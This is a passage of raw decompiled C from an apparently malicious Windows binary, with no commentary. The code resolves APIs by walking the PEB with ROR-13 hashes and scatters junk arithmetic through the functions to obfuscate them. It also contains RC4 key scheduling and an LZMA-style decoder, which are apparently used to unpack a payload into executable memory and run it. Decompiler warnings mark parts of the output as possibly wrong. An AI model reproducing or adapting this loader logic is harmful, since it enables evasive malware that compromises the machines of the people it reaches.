  dword_443020 = ((unsigned int)&GetLastError >> 1) - (((unsigned int)&GetLastError & 1) + 29779);
  dword_444BEB = dword_444B7D;
  LOBYTE(dword_443028) = -7;
  dword_443038 = 22565;
  dword_443030 = (char *)&SetLastError - off_4445D4;
  dword_443010 -= 27770;
  dword_443034 += 9996;
  dword_444B7D ^= (v0 >> 8) ^ v0 ^ ((unsigned int)dword_444B7D >> 19);
  dword_44302C = 13107;
  dword_444BE3 = dword_444B7D;
  result = dword_444B7D;
  LOBYTE(dword_443008) = -5;
  return result;
}
// 443008: using guessed type int dword_443008;
// 443010: using guessed type int dword_443010;
// 443014: using guessed type int dword_443014;
// 443020: using guessed type int dword_443020;
// 443028: using guessed type int dword_443028;
// 44302C: using guessed type int dword_44302C;
// 443030: using guessed type int dword_443030;
// 443034: using guessed type int dword_443034;
// 443038: using guessed type int dword_443038;
// 4445D4: using guessed type char *off_4445D4;
// 444A72: using guessed type int dword_444A72;
// 444B7D: using guessed type int dword_444B7D;
// 444B95: using guessed type int dword_444B95;
// 444BE3: using guessed type int dword_444BE3;
// 444BEB: using guessed type int dword_444BEB;

//----- (0040D1AE) --------------------------------------------------------
struct _LIST_ENTRY *__usercall sub_40D1AE@<eax>(int a1@<edi>, int a2@<esi>)
{
  struct _LIST_ENTRY *Flink; // edx
  int v3; // ebx
  int Flink_low; // eax
  struct _LIST_ENTRY *v5; // esi
  int v6; // edi
  unsigned int v7; // ebx
  int v8; // ecx
  struct _LIST_ENTRY *v9; // ebx
  struct _LIST_ENTRY *result; // eax

  dword_443034 = a2;
  dword_443008 += a1;
  Flink = NtCurrentPeb()->Ldr->InMemoryOrderModuleList.Flink;
  do
  {
    v5 = Flink[5].Flink;
    v8 = 24;
    v6 = 0;
    v7 = (unsigned int)&GetLastError;
    do
    {
      BYTE1(v7) += 101;
      LOBYTE(dword_44304C) = dword_44304C + 44;
      LOBYTE(dword_44300C) = 42;
      v3 = v7 ^ 0x3294;
      Flink_low = LOBYTE(v5->Flink);
      v5 = (struct _LIST_ENTRY *)((char *)v5 + 1);
      LOBYTE(dword_443030) = dword_443030 - 48;
      if ( (char)Flink_low >= 97 )
      {
        v3 = dword_44440C;
        LOBYTE(Flink_low) = Flink_low - 32;
        BYTE1(v3) = byte_443CD0 + BYTE1(dword_44440C);
      }
      dword_443018 -= v3 | 0x1A7E;
      v6 = Flink_low + __ROR4__(v6, 13);
      LOBYTE(dword_443014) = -54;
      v7 = v8--;
    }
    while ( v8 );
    v9 = Flink[2].Flink;
    Flink = Flink->Flink;
    LOBYTE(dword_443044) = -21;
  }
  while ( v6 != 1783282779 );
  result = v9;
  LOBYTE(dword_443004) = -96;
  LOBYTE(dword_443030) = -127;
  return result;
}
// 443004: using guessed type int dword_443004;
// 443008: using guessed type int dword_443008;
// 44300C: using guessed type int dword_44300C;
// 443014: using guessed type int dword_443014;
// 443018: using guessed type int dword_443018;
// 443030: using guessed type int dword_443030;
// 443034: using guessed type int dword_443034;
// 443044: using guessed type int dword_443044;
// 44304C: using guessed type int dword_44304C;
// 443CD0: using guessed type char byte_443CD0;
// 44440C: using guessed type int dword_44440C;

//----- (0040D1C3) --------------------------------------------------------
_BYTE *__cdecl sub_40D1C3(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // eax
  char v3; // cl

  result = a1;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return result;
}

//----- (0040D955) --------------------------------------------------------
char *__usercall sub_40D955@<eax>(int a1@<edi>, int a2@<esi>, int a3)
{
  unsigned int i; // esi
  struct _LIST_ENTRY *v5; // ebx
  _DWORD *v6; // edi
  unsigned __int16 *v7; // [esp+10h] [ebp-Ch]
  _DWORD *v8; // [esp+14h] [ebp-8h]
  int v9; // [esp+18h] [ebp-4h]

  v5 = sub_40D1AE(a1, a2);
  v6 = (struct _LIST_ENTRY **)((char *)&v5->Flink + *(unsigned int *)((char *)&v5[15].Flink + (unsigned int)v5[7].Blink));
  if ( HIWORD(a3) )
  {
    v8 = (struct _LIST_ENTRY **)((char *)&v5->Flink + v6[8]);
    v7 = (unsigned __int16 *)((char *)v5 + v6[9]);
    for ( i = 0; v6[6] > i; ++i )
    {
      if ( sub_40E5D4((_BYTE *)v5 + *v8) == a3 )
      {
        v9 = *v7;
        break;
      }
      ++v8;
      ++v7;
    }
    if ( v6[6] == i )
      return 0;
  }
  else
  {
    v9 = (unsigned __int16)a3 - v6[4];
  }
  return (char *)v5 + *(unsigned int *)((char *)&v5->Flink + 4 * v9 + v6[7]);
}
// 40DB37: variable 'v9' is possibly undefined

//----- (0040D9EE) --------------------------------------------------------
char *__usercall sub_40D9EE@<eax>(char a1@<dh>, int a2@<ebx>)
{
  unsigned int v2; // eax
  int v3; // ebx
  char *result; // eax
  int v5; // ecx
  int v6; // ecx
  int v7; // ecx
  int v8; // edx
  int v9; // esi
  int v10; // edi
  unsigned int v11; // ecx
  unsigned __int64 v12; // kr00_8
  char *v13; // ebx
  unsigned int v14; // edx
  char *v15; // ecx
  int v16; // eax
  int v17; // ebx
  int v18; // ecx
  void *v19; // edi
  int v20; // ecx
  unsigned int v21; // ebx
  int v22; // ecx
  char v23; // al
  unsigned int v24; // ebx
  _BYTE *v25; // edi
  HANDLE (__stdcall **v26)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR); // esi
  int v27; // ecx
  int v28; // edi
  BOOL (__stdcall **v29)(HANDLE); // ebx
  int v30; // ecx
  bool v31; // cf
  int v32; // [esp-8h] [ebp-8h]
  int v33; // [esp-4h] [ebp-4h]
  int v34; // [esp-4h] [ebp-4h]

  v18 = 0x2000;
  v17 = a2 - dword_4444C4;
  v19 = &unk_426686;
  BYTE1(v17) = a1;
  do
  {
    v33 = v18;
    v2 = sub_40C6A5();
    dword_443014 -= v17;
    *(_BYTE *)v19 = v2;
    v19 = (char *)v19 + 1;
    dword_443014 -= 22;
    v18 = v33 - 1;
  }
  while ( v33 != 1 );
  dword_443040 += (int)v19;
  v28 = (int)v19 + (v2 < 0xA4D) + 7520;
  dword_444BA9(255, &unk_426586);
  LOBYTE(dword_443014) = 30;
  dword_443040 = v28;
  v28 += 9935;
  dword_443034 = 30204;
  dword_444A4E(693, &unk_426586, &unk_444BC9, 0, &unk_444A7A);
  dword_443048 = v28;
  v15 = (char *)&LoadLibraryA + (v14 < 0x2A3D) + 10689;
  dword_44302C += v14 - 10813;
  LOBYTE(v15) = (unsigned __int8)&LoadLibraryA
              + (v14 < 0x2A3D)
              - 63
              - ((unsigned __int16)((unsigned __int16)&LoadLibraryA + (v14 < 0x2A3D) + 10689) >> 8);
  v16 = dword_444B8D(v15, &unk_444A7A, -1073741824, 1, 0, 2, 32, 0);
  dword_44300C -= v28;
  dword_443020 = (int)&LocalFree;
  v29 = &CloseHandle;
  dword_443038 += 17150;
  BYTE1(v29) = byte_4446A8;
  dword_44303C = v28 + 22986;
  dword_444A4A(v16, &unk_426686, 0x2000, &dword_444A42, 0, v16);
  dword_443010 += 4756;
  dword_444B9D(v7);
  LOBYTE(dword_443030) = 111;
  v9 = __CFSHR__(v29, 2) + v28 + 22986 - (v31 + v8) + 5333;
  dword_44304C = 7724;
  v27 = 0x2000;
  v25 = &unk_426686;
  v26 = (HANDLE (__stdcall **)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR))((v9 ^ 0x1724) + 36807);
  do
  {
    dword_44302C -= (int)v26;
    v32 = v27;
    v24 = dword_443960;
    dword_443024 -= (int)v26;
    v23 = sub_40C6A5();
    BYTE1(v24) = byte_4444A8;
    *v25++ = v23;
    dword_44304C -= 16270;
    dword_443028 += v24;
    dword_443018 = v24;
    v26 = &CreateEventA;
    v27 = v32 - 1;
  }
  while ( v32 != 1 );
  v31 = dword_443030 < v24;
  dword_443030 -= v24;
  dword_443044 += v24;
  v31 = __CFADD__(dword_443D0C, (char *)&CreateEventA + v31 + 23287);
  LOBYTE(dword_443034) = 5;
  v10 = v31 + dword_44321C + 30695;
  result = sub_40D955(v10, 14517, 1769630462);
  dword_443040 = 14517;
  if ( result )
  {
    v13 = result - 1;
    dword_443034 = dword_443054 + v10;
    dword_444A42 = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
    LOBYTE(dword_443004) = dword_443004 + 20;
    result = sub_40D955(dword_443054 + v10, 17028, 976580703);
    dword_443010 -= (int)v13;
    dword_44300C = v6;
    if ( result )
    {
      dword_444BCF = (int)result;
      v30 = 34454;
      dword_44300C += dword_443454;
      LOBYTE(dword_443004) = dword_443004 + 84;
      v3 = 19698;
      LOBYTE(v30) = byte_44409C - 106;
      result = (char *)dword_444A42(v30, 0, 0x2000, 12288, 64);
      dword_443038 += v5;
      if ( result )
      {
        dword_444BD7 = (int)result;
        LOBYTE(dword_44303C) = -104;
        dword_443034 += 30908;
        v31 = __CFADD__(v5, dword_443010);
        dword_443010 += v5;
        BYTE1(v3) = v31 + 76 - byte_4440AC + 114;
        dword_443014 += v3;
        dword_443028 = (int)&GetCurrentProcessId;
        dword_443044 = 3999;
        v34 = dword_444B8D(v5, &unk_444A7A, -1073741824, 1, 0, 3, 0, 0);
        dword_44304C -= 10802;
        BYTE1(v3) = (unsigned __int16)(v3 + 11217) >> 8;
        v12 = __PAIR64__(v11, dword_444674) + ((unsigned int)v3 | 0x32FD00000000i64);
        dword_443008 += 27977;
        dword_443044 += 27877;
        dword_444BC5(HIDWORD(v12), &LocalFree, v34, dword_444BD7, 0x2000, &unk_426586, 0, v34);
        dword_443028 = 31664;
        dword_444B9D(v31 + v20 + 5249);
        v21 = v12 - (v31 + 11408);
        LOBYTE(dword_443024) = -18;
        ++v22;
        v31 = dword_44303C < v21;
        dword_44303C -= v21;
        LOBYTE(v22) = v31 + v22 + 118;
        dword_444A3E(v22, &unk_444A7A);
        JUMPOUT(0x40D15D);
      }
    }
  }
  dword_443034 -= 936;
  return result;
}
// 40E7F7: control flows out of bounds to 40D15D
// 40ED12: conditional instruction was optimized away because %0x18.4==1
// 40BD31: variable 'v5' is possibly undefined
// 40C81F: variable 'v11' is possibly undefined
// 40DFC0: variable 'v31' is possibly undefined
// 40DFC0: variable 'v20' is possibly undefined
// 40DFE8: variable 'v22' is possibly undefined
// 40BDED: variable 'v6' is possibly undefined
// 40CEB9: variable 'v14' is possibly undefined
// 40C4B1: variable 'v7' is possibly undefined
// 40C4BE: variable 'v8' is possibly undefined
// 443004: using guessed type int dword_443004;
// 443008: using guessed type int dword_443008;
// 44300C: using guessed type int dword_44300C;
// 443010: using guessed type int dword_443010;
// 443014: using guessed type int dword_443014;
// 443018: using guessed type int dword_443018;
// 443020: using guessed type int dword_443020;
// 443024: using guessed type int dword_443024;
// 443028: using guessed type int dword_443028;
// 44302C: using guessed type int dword_44302C;
// 443030: using guessed type int dword_443030;
// 443034: using guessed type int dword_443034;
// 443038: using guessed type int dword_443038;
// 44303C: using guessed type int dword_44303C;
// 443040: using guessed type int dword_443040;
// 443044: using guessed type int dword_443044;
// 443048: using guessed type int dword_443048;
// 44304C: using guessed type int dword_44304C;
// 443054: using guessed type int dword_443054;
// 44321C: using guessed type int dword_44321C;
// 443454: using guessed type int dword_443454;
// 443960: using guessed type int dword_443960;
// 443D0C: using guessed type int dword_443D0C;
// 44409C: using guessed type char byte_44409C;
// 4440AC: using guessed type char byte_4440AC;
// 4444A8: using guessed type char byte_4444A8;
// 4444C4: using guessed type int dword_4444C4;
// 444674: using guessed type int dword_444674;
// 4446A8: using guessed type char byte_4446A8;
// 444A3E: using guessed type int (__thiscall *dword_444A3E)(_DWORD, _DWORD);
// 444A42: using guessed type int (__thiscall *dword_444A42)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444A4A: using guessed type int (__stdcall *dword_444A4A)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444A4E: using guessed type int (__thiscall *dword_444A4E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444B8D: using guessed type __int64 (__thiscall *dword_444B8D)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444B9D: using guessed type int (__thiscall *dword_444B9D)(_DWORD);
// 444BA9: using guessed type int (__stdcall *dword_444BA9)(_DWORD, _DWORD);
// 444BC5: using guessed type int (__fastcall *dword_444BC5)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444BCF: using guessed type int dword_444BCF;
// 444BD7: using guessed type int dword_444BD7;

//----- (0040DF44) --------------------------------------------------------
void __userpurge sub_40DF44(int a1@<eax>, int a2@<ecx>, int a3, int a4, int a5)
{
  int v5; // eax
  char v6; // cf
  int v7; // eax
  int v8; // ecx
  char v9[120]; // [esp+ACh] [ebp-D0h] BYREF
  int v10; // [esp+124h] [ebp-58h]
  unsigned __int16 v11; // [esp+130h] [ebp-4Ch]
  int v12; // [esp+144h] [ebp-38h]
  int v13; // [esp+148h] [ebp-34h]
  unsigned __int8 v14; // [esp+14Ch] [ebp-30h]

  sub_406936(a1, a2, -1510477400);
  v5 = sub_40B3EA();
  v12 ^= v5;
  v10 |= v5;
  sub_406602(((v11 < 0x273Eu) + v11 - 10046 + 13325) ^ 0x1218);
  v13 -= (__CFADD__(v6, v7) | __CFADD__(v6 + v7, 8536)) + v14;
  sub_407424(v8);
  sub_40814C(0);
  sub_409D0C(13, (int)v9, 0);
}
// 40E972: variable 'v6' is possibly undefined
// 40E972: variable 'v7' is possibly undefined
// 40E97F: variable 'v8' is possibly undefined
// 40DF44: using guessed type char var_D0[120];

//----- (0040E04F) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __userpurge sub_40E04F@<eax>(
        unsigned int a1@<eax>,
        int a2@<edx>,
        _DWORD *a3@<ecx>,
        _DWORD *a4@<ebp>,
        int a5@<esi>,
        int a6,
        int a7,
        int a8)
{
  unsigned int v8; // eax
  int v9; // edi
  unsigned int v10; // ecx
  unsigned int v11; // edi
  unsigned int v12; // edi
  int v13; // ecx
  unsigned int v14; // edx
  int v15; // esi
  int v16; // edx
  int v17; // edi
  int v19; // edx
  unsigned int v20; // eax
  unsigned int *v21; // edx
  unsigned int *v22; // edi
  int v23; // ecx
  int v24; // edx
  unsigned int v25; // edx
  unsigned int v26; // esi
  int v27; // ebx
  unsigned int *v28; // ecx
  unsigned int v29; // eax
  int v30; // ecx
  int v31; // ebx
  int v32; // edi
  int v33; // ecx
  unsigned int v34; // ecx
  unsigned int v35; // edx
  unsigned int v36; // ebx
  int v37; // ecx
  unsigned int v38; // eax
  unsigned int *v39; // edi
  int v40; // esi
  unsigned int v41; // ecx
  unsigned int v42; // esi
  unsigned int v43; // edx
  unsigned int v44; // edi
  unsigned int v45; // esi
  int v46; // ecx
  unsigned int v47; // ecx
  int v48; // esi
  unsigned int v49; // edi
  int v50; // ecx
  int v51; // edx
  unsigned int *v52; // ecx
  int v53; // esi
  int v54; // ecx
  unsigned int v55; // edi
  unsigned int *v56; // edx
  int v57; // ecx
  unsigned int v58; // eax
  bool v59; // zf
  int v60; // edx
  int v61; // ebx
  bool v62; // cc
  unsigned int v63; // edi
  unsigned int v64; // eax
  unsigned int *v65; // edi
  int v66; // ecx
  bool v67; // cc
  int v68; // ecx
  unsigned int *v69; // edi
  int v70; // ecx
  int v71; // edi
  unsigned int v72; // edi
  unsigned int v73; // ecx
  int v74; // edx
  int v75; // edi
  unsigned int *v76; // edx
  int v77; // ecx
  unsigned int v78; // ecx
  int v79; // ecx
  unsigned int v80; // edx
  unsigned int *v81; // ecx
  int v82; // edx
  int v83; // edi
  unsigned int v84; // ecx
  unsigned int v85; // edi
  unsigned int v86; // ecx
  unsigned int v87; // ebx
  int v88; // edx
  int v89; // edx
  unsigned int v90; // eax
  unsigned int v91; // ecx
  unsigned int v92; // esi
  int v93; // edx
  unsigned int v94; // ecx
  int v95; // ecx
  unsigned int v96; // esi
  int v97; // ebx
  char *v98; // ecx
  unsigned int v99; // edx
  int v100; // ecx
  bool v101; // sf
  bool v102; // of
  unsigned int v103; // ecx
  unsigned int v104; // edi
  int v105; // ecx
  int v106; // edx
  int v107; // ecx
  char v108; // dl
  int v109; // esi

  *a3 = a2;
  if ( a1 < 0x1000000 )
  {
    v88 = *(unsigned __int8 *)*(a4 - 2) | (a4[3] << 8);
    a1 <<= 8;
    ++*(a4 - 2);
    a4[3] = v88;
  }
  v43 = a3[1];
  v44 = v43 * (a1 >> 11);
  if ( a4[3] >= v44 )
  {
    a4[3] -= v44;
    v8 = a1 - v44;
    a3[1] = v43 - (v43 >> 5);
    v81 = a3 + 258;
    *(a4 - 9) = 16;
    *(a4 - 8) = 8;
    goto LABEL_71;
  }
  v8 = v43 * (a1 >> 11);
  a3[1] = v43 + ((2048 - v43) >> 5);
  v81 = &a3[8 * a5 + 130];
  *(a4 - 9) = 8;
  while ( 1 )
  {
    *(a4 - 8) = 3;
LABEL_71:
    *(a4 - 11) = *(a4 - 8);
    v27 = 1;
    do
    {
      if ( v8 < 0x1000000 )
      {
        v93 = *(unsigned __int8 *)*(a4 - 2) | (a4[3] << 8);
        v8 <<= 8;
        ++*(a4 - 2);
        a4[3] = v93;
      }
      v25 = v81[v27];
      v26 = v25 * (v8 >> 11);
      if ( a4[3] >= v26 )
      {
        a4[3] -= v26;
        v8 -= v26;
        v81[v27] = v25 - (v25 >> 5);
        v27 = 2 * v27 + 1;
      }
      else
      {
        v8 = v25 * (v8 >> 11);
        v81[v27] = v25 + ((2048 - v25) >> 5);
        v27 *= 2;
      }
      v59 = (*(a4 - 11))-- == 1;
    }
    while ( !v59 );
    v60 = 1;
    v61 = *(a4 - 9) - (1 << *(a4 - 8)) + v27;
    v62 = *(a4 - 3) < 4;
    *(a4 - 12) = v61;
    if ( v62 )
    {
      *(a4 - 3) += 7;
      if ( v61 >= 4 )
        v95 = 3;
      else
        v95 = v61;
      v17 = (v95 << 8) + a4[4] + 1728;
      *(a4 - 11) = 6;
      do
      {
        if ( v8 < 0x1000000 )
        {
          v100 = *(unsigned __int8 *)*(a4 - 2) | (a4[3] << 8);
          v8 <<= 8;
          ++*(a4 - 2);
          a4[3] = v100;
        }
        v91 = *(_DWORD *)(v17 + 4 * v60);
        v92 = v91 * (v8 >> 11);
        if ( a4[3] >= v92 )
        {
          a4[3] -= v92;
          v8 -= v92;
          *(_DWORD *)(v17 + 4 * v60) = v91 - (v91 >> 5);
          v60 = 2 * v60 + 1;
        }
        else
        {
          v8 = v91 * (v8 >> 11);
          *(_DWORD *)(v17 + 4 * v60) = v91 + ((2048 - v91) >> 5);
          v60 *= 2;
        }
        v59 = (*(a4 - 11))-- == 1;
      }
      while ( !v59 );
      v106 = v60 - 64;
      v32 = v106;
      if ( v106 >= 4 )
      {
        v107 = (v106 >> 1) - 1;
        v9 = v106 & 1 | 2;
        *(a4 - 5) = v107;
        if ( v106 >= 14 )
        {
          v50 = (v106 >> 1) - 5;
          do
          {
            if ( v8 < 0x1000000 )
            {
              v82 = *(unsigned __int8 *)*(a4 - 2) | (a4[3] << 8);
              v8 <<= 8;
              ++*(a4 - 2);
              a4[3] = v82;
            }
            v8 >>= 1;
            v9 *= 2;
            if ( a4[3] >= v8 )
            {
              a4[3] -= v8;
              v9 |= 1u;
            }
            --v50;
          }
          while ( v50 );
          v31 = a4[4] + 3208;
          v32 = 16 * v9;
          *(a4 - 5) = 4;
        }
        else
        {
          v32 = v9 << v107;
          v31 = a4[4] + 4 * (v32 - v106) + 2748;
        }
        v33 = 1;
        *(a4 - 8) = v31;
        *(a4 - 9) = 1;
        do
        {
          if ( v8 < 0x1000000 )
          {
            v51 = *(unsigned __int8 *)*(a4 - 2) | (a4[3] << 8);
            v8 <<= 8;
            ++*(a4 - 2);
            a4[3] = v51;
          }
          v99 = *(_DWORD *)(v31 + 4 * v33);
          v96 = v99 * (v8 >> 11);
          if ( a4[3] >= v96 )
          {
            a4[3] -= v96;
            v31 = *(a4 - 8);
            v8 -= v96;
            v32 |= *(a4 - 9);
            *(_DWORD *)(v31 + 4 * v33) = v99 - (v99 >> 5);
            v33 = 2 * v33 + 1;
          }
          else
          {
            v8 = v99 * (v8 >> 11);
            *(_DWORD *)(v31 + 4 * v33) = v99 + ((2048 - v99) >> 5);
            v33 *= 2;
          }
          *(a4 - 9) *= 2;
          v59 = (*(a4 - 5))-- == 1;
        }
        while ( !v59 );
      }
      v75 = v32 + 1;
      *(a4 - 5) = v75;
      if ( !v75 )
        return *(a4 - 4);
      v61 = *(a4 - 12);
    }
    else
    {
      v75 = *(a4 - 5);
    }
    v97 = v61 + 2;
    v98 = (char *)(a4[2] + *(a4 - 4) - v75);
    do
    {
      v108 = *v98;
      v109 = *(a4 - 4);
      v83 = a4[2];
      --v97;
      *(a4 - 4) = v109 + 1;
      ++v98;
      *((_BYTE *)a4 - 1) = v108;
      *(_BYTE *)(v109 + v83) = v108;
    }
    while ( v97 );
    while ( 1 )
    {
      while ( 1 )
      {
        v48 = *(a4 - 4) & 3;
        v69 = (unsigned int *)(a4[4] + 4 * (v48 + 16 * *(a4 - 3)));
        if ( v8 < 0x1000000 )
        {
          v70 = *(unsigned __int8 *)*(a4 - 2) | (a4[3] << 8);
          v8 <<= 8;
          ++*(a4 - 2);
          a4[3] = v70;
        }
        v86 = *v69;
        v87 = *v69 * (v8 >> 11);
        if ( a4[3] >= v87 )
          break;
        v45 = v86 + ((2048 - v86) >> 5);
        v46 = 3072 * *((unsigned __int8 *)a4 - 1);
        *v69 = v45;
        v24 = 1;
        v62 = *(a4 - 3) < 7;
        v8 = v87;
        *(a4 - 8) = v46 + a4[4] + 7384;
        if ( !v62 )
        {
          *(a4 - 9) = *(unsigned __int8 *)(*(a4 - 4) - *(a4 - 5) + a4[2]);
          while ( 1 )
          {
            *(a4 - 9) *= 2;
            v40 = *(a4 - 9) & 0x100;
            v28 = (unsigned int *)(*(a4 - 8) + 4 * (v40 + v24) + 1024);
            *(a4 - 11) = v28;
            if ( v8 < 0x1000000 )
            {
              v71 = *(unsigned __int8 *)*(a4 - 2) | (a4[3] << 8);
              v8 <<= 8;
              ++*(a4 - 2);
              a4[3] = v71;
            }
            v84 = *v28;
            v85 = v84 * (v8 >> 11);
            if ( a4[3] >= v85 )
            {
              a4[3] -= v85;
              v8 -= v85;
              v94 = v84 - (v84 >> 5);
              *(_DWORD *)*(a4 - 11) = v94;
              v24 = 2 * v24 + 1;
              if ( !v40 )
                goto LABEL_69;
            }
            else
            {
              v8 = v84 * (v8 >> 11);
              v24 *= 2;
              *(_DWORD *)*(a4 - 11) = v84 + ((2048 - v84) >> 5);
              if ( v40 )
                goto LABEL_69;
            }
            if ( v24 >= 256 )
              goto LABEL_53;
          }
        }
        do
        {
          v22 = (unsigned int *)(*(a4 - 8) + 4 * v24);
          if ( v8 < 0x1000000 )
          {
            v23 = *(unsigned __int8 *)*(a4 - 2) | (a4[3] << 8);
            v8 <<= 8;
            ++*(a4 - 2);
            a4[3] = v23;
          }
          v41 = *v22;
          v42 = *v22 * (v8 >> 11);
          if ( a4[3] >= v42 )
          {
            a4[3] -= v42;
            v8 -= v42;
            *v22 = v41 - (v41 >> 5);
            v24 = 2 * v24 + 1;
          }
          else
          {
            v8 = *v22 * (v8 >> 11);
            *v22 = v41 + ((2048 - v41) >> 5);
            v24 *= 2;
          }
LABEL_69:
          ;
        }
        while ( v24 < 256 );
LABEL_53:
        v53 = *(a4 - 4);
        v54 = a4[2];
        ++*(a4 - 4);
        v62 = *(a4 - 3) < 4;
        *((_BYTE *)a4 - 1) = v24;
        *(_BYTE *)(v53 + v54) = v24;
        if ( v62 )
        {
          *(a4 - 3) = 0;
        }
        else if ( (int)*(a4 - 3) >= 10 )
        {
          *(a4 - 3) -= 6;
        }
        else
        {
          *(a4 - 3) -= 3;
        }
      }
      a4[3] -= v87;
      v19 = *(a4 - 3);
      v20 = v8 - v87;
      *v69 = v86 - (v86 >> 5);
      v21 = (unsigned int *)(a4[4] + 4 * v19 + 768);
      if ( v20 < 0x1000000 )
      {
        v79 = *(unsigned __int8 *)*(a4 - 2) | (a4[3] << 8);
        v20 <<= 8;
        ++*(a4 - 2);
        a4[3] = v79;
      }
      v103 = *v21;
      v104 = *v21 * (v20 >> 11);
      if ( a4[3] < v104 )
        break;
      a4[3] -= v104;
      v64 = v20 - v104;
      *v21 = v103 - (v103 >> 5);
      v65 = (unsigned int *)(a4[4] + 4 * *(a4 - 3) + 816);
      if ( v64 < 0x1000000 )
      {
        v66 = *(unsigned __int8 *)*(a4 - 2) | (a4[3] << 8);
        v64 <<= 8;
        ++*(a4 - 2);
        a4[3] = v66;
      }
      v34 = *v65;
      v35 = *v65 * (v64 >> 11);
      if ( a4[3] >= v35 )
      {
        a4[3] -= v35;
        v29 = v64 - v35;
        v47 = v34 - (v34 >> 5);
        v16 = a4[4];
        *v65 = v47;
        v76 = (unsigned int *)(v16 + 4 * *(a4 - 3) + 864);
        if ( v29 < 0x1000000 )
        {
          v77 = *(unsigned __int8 *)*(a4 - 2) | (a4[3] << 8);
          v29 <<= 8;
          ++*(a4 - 2);
          a4[3] = v77;
        }
        v78 = *v76;
        v55 = v78 * (v29 >> 11);
        if ( a4[3] >= v55 )
        {
          a4[3] -= v55;
          v58 = v29 - v55;
          *v76 = v78 - (v78 >> 5);
          v56 = (unsigned int *)(a4[4] + 4 * *(a4 - 3) + 912);
          if ( v58 < 0x1000000 )
          {
            v57 = *(unsigned __int8 *)*(a4 - 2) | (a4[3] << 8);
            v58 <<= 8;
            ++*(a4 - 2);
            a4[3] = v57;
          }
          v10 = *v56;
          v11 = *v56 * (v58 >> 11);
          if ( a4[3] >= v11 )
          {
            a4[3] -= v11;
            v90 = v58 - v11;
            *v56 = v10 - (v10 >> 5);
            v13 = *(a4 - 10);
            *(a4 - 10) = *(a4 - 6);
          }
          else
          {
            v90 = *v56 * (v58 >> 11);
            v12 = v10 + ((2048 - v10) >> 5);
            v13 = *(a4 - 6);
            *v56 = v12;
          }
          *(a4 - 6) = *(a4 - 7);
        }
        else
        {
          v90 = v78 * (v29 >> 11);
          v63 = v78 + ((2048 - v78) >> 5);
          v13 = *(a4 - 7);
          *v76 = v63;
        }
        *(a4 - 7) = *(a4 - 5);
        *(a4 - 5) = v13;
        goto LABEL_72;
      }
      v36 = v34 + ((2048 - v34) >> 5);
      v37 = 16 * (*(a4 - 3) + 15);
      *v65 = v36;
      v38 = v35;
      v39 = (unsigned int *)(a4[4] + 4 * (v48 + v37));
      if ( v35 < 0x1000000 )
      {
        v38 = v35 << 8;
        v30 = *(unsigned __int8 *)(*(a4 - 2))++ | (a4[3] << 8);
        a4[3] = v30;
      }
      v73 = *v39;
      v14 = v73 * (v38 >> 11);
      if ( a4[3] >= v14 )
      {
        a4[3] -= v14;
        v90 = v38 - v14;
        *v39 = v73 - (v73 >> 5);
LABEL_72:
        *(a4 - 3) = *(a4 - 3) >= 7 ? 11 : 8;
        v52 = (unsigned int *)(a4[4] + 5328);
        goto LABEL_3;
      }
      v15 = *(a4 - 4);
      v8 = v73 * (v38 >> 11);
      v102 = __OFSUB__(*(a4 - 3), 7);
      v101 = *(a4 - 3) - 7 < 0;
      *v39 = v73 + ((2048 - v73) >> 5);
      v74 = a4[2];
      *(a4 - 3) = 2 * (v101 == v102) + 9;
      v105 = *(a4 - 4) - *(a4 - 5);
      ++*(a4 - 4);
      LOBYTE(v105) = *(_BYTE *)(v105 + v74);
      *((_BYTE *)a4 - 1) = v105;
      *(_BYTE *)(v15 + v74) = v105;
    }
    v90 = *v21 * (v20 >> 11);
    v49 = v103 + ((2048 - v103) >> 5);
    v67 = *(a4 - 3) < 7;
    *(a4 - 10) = *(a4 - 6);
    *(a4 - 6) = *(a4 - 7);
    v68 = *(a4 - 5);
    *v21 = v49;
    *(a4 - 7) = v68;
    *(a4 - 3) = v67 ? 0 : 3;
    v52 = (unsigned int *)(a4[4] + 3272);
LABEL_3:
    if ( v90 < 0x1000000 )
    {
      v89 = *(unsigned __int8 *)*(a4 - 2) | (a4[3] << 8);
      v90 <<= 8;
      ++*(a4 - 2);
      a4[3] = v89;
    }
    v80 = *v52;
    v72 = v80 * (v90 >> 11);
    if ( a4[3] >= v72 )
      break;
    v8 = v80 * (v90 >> 11);
    *(a4 - 9) = 0;
    *v52 = v80 + ((2048 - v80) >> 5);
    v81 = &v52[8 * v48 + 2];
  }
  a4[3] -= v72;
  return sub_40E257(v90 - v72, v80 - (v80 >> 5), v52, a4, v48, a6, a7, a8);
}
// 40BF36: positive sp value 4 has been found

//----- (0040E2E1) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __cdecl sub_40E2E1(int a1, int a2, unsigned __int8 *a3)
{
  unsigned __int8 v3; // bl
  unsigned __int8 v4; // cl
  unsigned int i; // esi
  int result; // eax
  unsigned int v7; // esi
  unsigned __int8 *v8; // eax
  unsigned __int8 *v9; // [esp+2E0h] [ebp-8h]
  unsigned __int8 v10; // [esp+2E7h] [ebp-1h]

  v7 = 0;
  v8 = a3;
  do
  {
    v4 = v7++;
    *v8++ = v4;
  }
  while ( v7 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  v10 = 0;
  v3 = 0;
  v9 = a3;
  for ( i = 0; i < 0x100; ++i )
  {
    v3 = (v3 + *v9 + *(unsigned __int8 *)(a1 + v10)) % 256;
    sub_40D1C3(&a3[i], &a3[v3]);
    result = (v10 + 1) / a2;
    v10 = (v10 + 1) % a2;
    ++v9;
  }
  return result;
}
// 40CBCE: positive sp value 4 has been found

//----- (0040E459) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int sub_40E459()
{
  return 0;
}
// 40E469: positive sp value C has been found

//----- (0040E528) --------------------------------------------------------
